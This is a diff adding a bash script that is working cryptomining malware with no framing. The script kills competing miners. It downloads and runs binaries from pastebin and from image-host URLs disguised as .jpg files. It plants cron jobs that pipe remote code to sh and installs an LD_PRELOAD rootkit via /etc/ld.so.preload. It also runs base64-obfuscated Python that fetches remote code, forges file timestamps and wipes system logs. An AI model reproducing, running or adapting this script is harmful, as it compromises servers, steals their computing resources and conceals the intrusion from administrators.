@@ -1,0 +1,235 @@
+#!/bin/bash
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+function kills() {
+pkill -f sourplum
+pkill wnTKYg && pkill ddg* && rm -rf /tmp/ddg* && rm -rf /tmp/wnTKYg
+rm -rf /boot/grub/deamon && rm -rf /boot/grub/disk_genius
+rm -rf /tmp/*index_bak*
+rm -rf /tmp/*httpd.conf*
+rm -rf /tmp/*httpd.conf
+rm -rf /tmp/a7b104c270
+ps auxf|grep -v grep|grep "mine.moneropool.com"|awk '{print $2}'|xargs kill -9
+ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:8080"|awk '{print $2}'|xargs kill -9
+ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:3333"|awk '{print $2}'|xargs kill -9
+ps auxf|grep -v grep|grep "monerohash.com"|awk '{print $2}'|xargs kill -9
+ps auxf|grep -v grep|grep "/tmp/a7b104c270"|awk '{print $2}'|xargs kill -9
+ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:6666"|awk '{print $2}'|xargs kill -9
+ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:7777"|awk '{print $2}'|xargs kill -9
+ps auxf|grep -v grep|grep "xmr.crypto-pool.fr:443"|awk '{print $2}'|xargs kill -9
+ps auxf|grep -v grep|grep "stratum.f2pool.com:8888"|awk '{print $2}'|xargs kill -9
+ps auxf|grep -v grep|grep "xmrpool.eu" | awk '{print $2}'|xargs kill -9
+ps auxf|grep -v grep|grep "xmrig" | awk '{print $2}'|xargs kill -9
+ps auxf|grep -v grep|grep "xmrigDaemon" | awk '{print $2}'|xargs kill -9
+ps auxf|grep -v grep|grep "xmrigMiner" | awk '{print $2}'|xargs kill -9
+ps auxf|grep -v grep|grep "/var/tmp/java" | awk '{print $2}'|xargs kill -9
+pkill -f biosetjenkins
+pkill -f AnXqV.yam
+pkill -f xmrigDaemon
+pkill -f xmrigMiner
+pkill -f xmrig
+pkill -f Loopback
+pkill -f apaceha
+pkill -f cryptonight
+pkill -f stratum
+pkill -f mixnerdx
+pkill -f performedl
+pkill -f JnKihGjn
+pkill -f irqba2anc1
+pkill -f irqba5xnc1
+pkill -f irqbnc1
+pkill -f ir29xc1
+pkill -f conns
+pkill -f irqbalance
+pkill -f crypto-pool
+pkill -f minexmr
+pkill -f XJnRj
+pkill -f NXLAi
+pkill -f BI5zj
+pkill -f askdljlqw
+pkill -f minerd
+pkill -f minergate
+pkill -f Guard.sh
+pkill -f ysaydh
+pkill -f bonns
+pkill -f donns
+pkill -f kxjd
+pkill -f Duck.sh
+pkill -f bonn.sh
+pkill -f conn.sh
+pkill -f kworker34
+pkill -f kw.sh
+pkill -f pro.sh
+pkill -f polkitd
+pkill -f acpid
+pkill -f icb5o
+pkill -f nopxi
+pkill -f irqbalanc1
+pkill -f minerd
+pkill -f i586
+pkill -f gddr
+pkill -f mstxmr
+pkill -f ddg.2011
+pkill -f wnTKYg
+pkill -f deamon
+pkill -f disk_genius
+pkill -f sourplum
+pkill -f bashx
+pkill -f bashg
+pkill -f bashe
+pkill -f bashf
+pkill -f bashh
+pkill -f XbashY
+pkill -f libapache
+rm -rf /tmp/httpd.conf
+rm -rf /tmp/conn
+rm -rf /tmp/root.sh /tmp/pools.txt /tmp/libapache /tmp/config.json /tmp/bashf /tmp/bashg /tmp/libapache
+rm -rf /tmp/conns
+rm -f /tmp/irq.sh
+rm -f /tmp/irqbalanc1
+rm -f /tmp/irq
+rm -rf /tmp/kworkerds /bin/kworkerds /bin/config.json
+netstat -anp | grep 69.28.55.86:443 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9
+netstat -anp | grep 185.71.65.238 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9
+netstat -anp | grep :3333 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9
+netstat -anp | grep :4444 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9
+netstat -anp | grep :5555 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9
+netstat -anp | grep :6666 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9
+netstat -anp | grep :7777 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9
+netstat -anp | grep :3347 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9
+netstat -anp | grep :14444 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9
+y=$(netstat -anp | grep kworkerds | wc -l)
+if [ ${y} -eq 0 ];then
+	netstat -anp | grep :13531 |awk '{print $7}'| awk -F'[/]' '{print $1}' | xargs kill -9
+fi
+}
+
+function system() {
+	if [ ! -f "/bin/httpdns" ]; then
+		curl -fsSL https://pastebin.com/raw/Fj2YdETv -o /bin/httpdns && chmod 755 /bin/httpdns
+		if [ ! -f "/bin/httpdns" ]; then
+			wget  https://pastebin.com/raw/Fj2YdETv -O /bin/httpdns && chmod 755 /bin/httpdns
+		fi
+		if [ ! -f "/etc/crontab" ]; then
+			echo -e "0 1 * * * root /bin/httpdns" >> /etc/crontab
+		else
+			sed -i '$d' /etc/crontab && echo -e "0 1 * * * root /bin/httpdns" >> /etc/crontab
+		fi
+	fi
+}
+
+function top() {
+	mkdir -p /usr/local/lib/
+	if [ ! -f "/usr/local/lib/libntp.so" ]; then
+		curl -fsSL http://thyrsi.com/t6/365/1535595427x-1404817712.jpg -o /usr/local/lib/libntp.so && chmod 755 /usr/local/lib/libntp.so
+		if [ ! -f "/usr/local/lib/libntp.so" ]; then
+			wget http://thyrsi.com/t6/365/1535595427x-1404817712.jpg -O /usr/local/lib/libntp.so && chmod 755 /usr/local/lib/libntp.so
+		fi
+	fi
+	if [ ! -f "/etc/ld.so.preload" ]; then
+		echo /usr/local/lib/libntp.so > /etc/ld.so.preload
+	else
+		sed -i '$d' /etc/ld.so.preload && echo /usr/local/lib/libntp.so >> /etc/ld.so.preload
+	fi
+	touch -acmr /bin/sh /etc/ld.so.preload
+	touch -acmr /bin/sh /usr/local/lib/libntp.so
+}
+
+function python() {
+	nohup python -c "import base64;exec(base64.b64decode('I2NvZGluZzogdXRmLTgKaW1wb3J0IHVybGxpYgppbXBvcnQgYmFzZTY0CgpkPSAnaHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L2VSa3JTUWZFJwp0cnk6CiAgICBwYWdlPWJhc2U2NC5iNjRkZWNvZGUodXJsbGliLnVybG9wZW4oZCkucmVhZCgpKQogICAgZXhlYyhwYWdlKQpleGNlcHQ6CiAgICBwYXNz'))" >/dev/null 2>&1 &
+	touch /tmp/.tmph
+}
+
+function echocron() {
+	echo -e "*/10 * * * * root (curl -fsSL https://pastebin.com/raw/5bjpjvLP || wget -q -O- https://pastebin.com/raw/5bjpjvLP)|sh\n##" > /etc/cron.d/root
+	echo -e "*/17 * * * * root (curl -fsSL https://pastebin.com/raw/5bjpjvLP || wget -q -O- https://pastebin.com/raw/5bjpjvLP)|sh\n##" > /etc/cron.d/system
+	echo -e "*/23 * * * *	(curl -fsSL https://pastebin.com/raw/5bjpjvLP || wget -q -O- https://pastebin.com/raw/5bjpjvLP)|sh\n##" > /var/spool/cron/root
+	mkdir -p /var/spool/cron/crontabs
+	echo -e "*/31 * * * *	(curl -fsSL https://pastebin.com/raw/5bjpjvLP || wget -q -O- https://pastebin.com/raw/5bjpjvLP)|sh\n##" > /var/spool/cron/crontabs/root
+	mkdir -p /etc/cron.hourly
+	curl -fsSL https://pastebin.com/raw/5bjpjvLP -o /etc/cron.hourly/oanacron && chmod 755 /etc/cron.hourly/oanacron
+	if [ ! -f "/etc/cron.hourly/oanacron" ]; then
+		wget https://pastebin.com/raw/5bjpjvLP -O /etc/cron.hourly/oanacron && chmod 755 /etc/cron.hourly/oanacron
+	fi
+	mkdir -p /etc/cron.daily
+	curl -fsSL https://pastebin.com/raw/5bjpjvLP -o /etc/cron.daily/oanacron && chmod 755 /etc/cron.daily/oanacron
+	if [ ! -f "/etc/cron.daily/oanacron" ]; then
+		wget https://pastebin.com/raw/5bjpjvLP -O /etc/cron.daily/oanacron && chmod 755 /etc/cron.daily/oanacron
+	fi
+	mkdir -p /etc/cron.monthly
+	curl -fsSL https://pastebin.com/raw/5bjpjvLP -o /etc/cron.monthly/oanacron && chmod 755 /etc/cron.monthly/oanacron
+	if [ ! -f "/etc/cron.monthly/oanacron" ]; then
+		wget https://pastebin.com/raw/5bjpjvLP -O /etc/cron.monthly/oanacron && chmod 755 /etc/cron.monthly/oanacron
+	fi
+	touch -acmr /bin/sh /var/spool/cron/root
+	touch -acmr /bin/sh /var/spool/cron/crontabs/root
+	touch -acmr /bin/sh /etc/cron.d/system
+	touch -acmr /bin/sh /etc/cron.d/root
+	touch -acmr /bin/sh /etc/cron.hourly/oanacron
+	touch -acmr /bin/sh /etc/cron.daily/oanacron
+	touch -acmr /bin/sh /etc/cron.monthly/oanacron
+}
+
+function downloadrun() {
+	ps=$(netstat -anp | grep :13531 | wc -l)
+	if [ ${ps} -eq 0 ];then
+		if [ ! -f "/tmp/kworkerds" ]; then
+			curl -fsSL http://thyrsi.com/t6/358/1534495127x-1404764247.jpg -o /tmp/kworkerds && chmod 777 /tmp/kworkerds
+			if [ ! -f "/tmp/kworkerds" ]; then
+				wget http://thyrsi.com/t6/358/1534495127x-1404764247.jpg -O /tmp/kworkerds && chmod 777 /tmp/kworkerds
+			fi
+				nohup /tmp/kworkerds >/dev/null 2>&1 &
+		else
+			nohup /tmp/kworkerds >/dev/null 2>&1 &
+		fi
+	fi
+}
+
+function downloadrunxm() {
+	pm=$(netstat -anp | grep :13531 | wc -l)
+	if [ ${pm} -eq 0 ];then
+		if [ ! -f "/bin/config.json" ]; then
+			curl -fsSL http://thyrsi.com/t6/358/1534496022x-1404764583.jpg -o /bin/config.json && chmod 777 /bin/config.json
+			if [ ! -f "/bin/config.json" ]; then
+				wget http://thyrsi.com/t6/358/1534496022x-1404764583.jpg -O /bin/config.json && chmod 777 /bin/config.json
+			fi
+		fi
+		if [ ! -f "/bin/kworkerds" ]; then
+			curl -fsSL http://thyrsi.com/t6/358/1534491798x-1404764420.jpg -o /bin/kworkerds && chmod 777 /bin/kworkerds
+			if [ ! -f "/bin/kworkerds" ]; then
+				wget http://thyrsi.com/t6/358/1534491798x-1404764420.jpg -O /bin/kworkerds && chmod 777 /bin/kworkerds
+			fi
+				nohup /bin/kworkerds >/dev/null 2>&1 &
+		else
+			nohup /bin/kworkerds >/dev/null 2>&1 &
+		fi
+	fi
+}
+
+update=$( curl -fsSL --connect-timeout 120 https://pastebin.com/raw/TzBeq3AM )
+if [ ${update}x = "update"x ];then
+	echocron
+else
+	if [ ! -f "/tmp/.tmph" ]; then
+		rm -rf /tmp/.tmpg
+		python
+	fi
+	kills
+	downloadrun
+	echocron
+	system
+	top
+	sleep 10
+	port=$(netstat -anp | grep :13531 | wc -l)
+	if [ ${port} -eq 0 ];then
+		downloadrunxm
+	fi
+	echo 0>/var/spool/mail/root
+	echo 0>/var/log/wtmp
+	echo 0>/var/log/secure
+	echo 0>/var/log/cron
+fi
+#
+#
+#
